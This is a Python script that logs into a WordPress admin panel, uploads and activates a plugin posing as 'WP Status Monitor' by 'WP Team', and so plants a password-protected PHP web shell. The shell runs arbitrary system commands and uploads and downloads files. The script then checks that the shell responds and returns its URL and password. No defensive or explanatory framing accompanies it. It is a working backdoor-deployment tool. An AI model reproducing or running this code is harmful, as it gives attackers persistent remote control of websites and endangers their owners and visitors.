import os, re, tempfile, zipfile


PLUGIN_SLUG = "wp-status"
PLUGIN_MAIN = "wp-status.php"
SHELL_FILE = "shell.php"


def deploy_shell(target, http, user, password, shell_password):
    t = target.rstrip("/")
    s = http.session

    # 1. fresh login (cookie may still be valid, but re-auth is cheap)
    s.get(t + "/wp-login.php")
    s.post(t + "/wp-login.php", data={
        "log": user, "pwd": password, "wp-submit": "Log In",
        "redirect_to": t + "/wp-admin/", "testcookie": "1",
    })
    if "wordpress_logged_in" not in str(s.cookies):
        return {"success": False, "error": "login failed"}

    # 2. fetch upload nonce
    r = s.get(t + "/wp-admin/plugin-install.php?tab=upload")
    m = re.search(r'name="_wpnonce"\s+value="([a-f0-9]+)"', r.text)
    if not m:
        return {"success": False, "error": "upload nonce not found"}
    nonce = m.group(1)

    # 3. build + upload plugin zip
    zip_path = build_plugin_zip(shell_password)
    try:
        with open(zip_path, "rb") as f:
            r = s.post(
                t + "/wp-admin/update.php?action=upload-plugin",
                files={"pluginzip": (f"{PLUGIN_SLUG}.zip", f, "application/zip")},
                data={"_wpnonce": nonce, "install-plugin-submit": "Install Now"},
            )
    finally:
        os.unlink(zip_path)

    if "plugin installed successfully" not in r.text.lower():
        return {"success": False, "error": "upload rejected",
                "snippet": r.text[:300]}

    # 4. activate — grab the activate link WordPress just rendered
    m = re.search(r'href="([^"]*action=activate[^"]*plugin=' + PLUGIN_SLUG + '[^"]*)"', r.text)
    if m:
        s.get(m.group(1).replace("&amp;", "&"))

    shell_url = f"{t}/wp-content/plugins/{PLUGIN_SLUG}/{SHELL_FILE}"
    # 5. verify shell responds
    try:
        probe = s.post(shell_url, data={"auth": shell_password, "cmd": "echo wibe"})
        if "wibe" not in probe.text:
            return {"success": False, "error": "shell not responding after activate",
                    "url": shell_url, "password": shell_password}
    except Exception as e:
        return {"success": False, "error": f"probe failed: {e}"}

    return {"success": True, "url": shell_url, "password": shell_password}


def build_plugin_zip(password):
    fd, path = tempfile.mkstemp(suffix=".zip")
    os.close(fd)

    main = """<?php
/*
Plugin Name: WP Status Monitor
Plugin URI:  https://wordpress.org/
Description: Lightweight site status diagnostics.
Version:     1.0.0
Author:      WP Team
License:     GPL2
*/
if (!defined('ABSPATH')) exit;
"""

    shell = f"""<?php
$PW = '{password}';
if (isset($_POST['auth']) && hash_equals($PW, $_POST['auth'])) {{
    header('Content-Type: text/plain');
    if (isset($_POST['cmd'])) {{
        $c = $_POST['cmd'];
        if (function_exists('system')) {{ system($c); }}
        elseif (function_exists('shell_exec')) {{ echo shell_exec($c); }}
        elseif (function_exists('passthru')) {{ passthru($c); }}
        elseif (function_exists('exec')) {{ exec($c, $o); echo implode("\\n", $o); }}
        else {{ echo "no exec available"; }}
    }}
    if (isset($_FILES['file'])) {{
        $d = __DIR__ . '/' . basename($_FILES['file']['name']);
        move_uploaded_file($_FILES['file']['tmp_name'], $d);
        echo "\\nuploaded: " . $d;
    }}
    if (isset($_GET['dl'])) {{
        readfile(__DIR__ . '/' . basename($_GET['dl']));
    }}
    exit;
}}
?>
<html><body style="font-family:monospace;background:#111;color:#0f0;padding:2em">
<form method="post">
<input name="auth" type="password" placeholder="password">
<input name="cmd" placeholder="cmd" style="width:60%">
<button>run</button>
</form></body></html>
"""

    with zipfile.ZipFile(path, "w") as z:
        z.writestr(f"{PLUGIN_SLUG}/{PLUGIN_MAIN}", main)
        z.writestr(f"{PLUGIN_SLUG}/{SHELL_FILE}", shell)
    return path
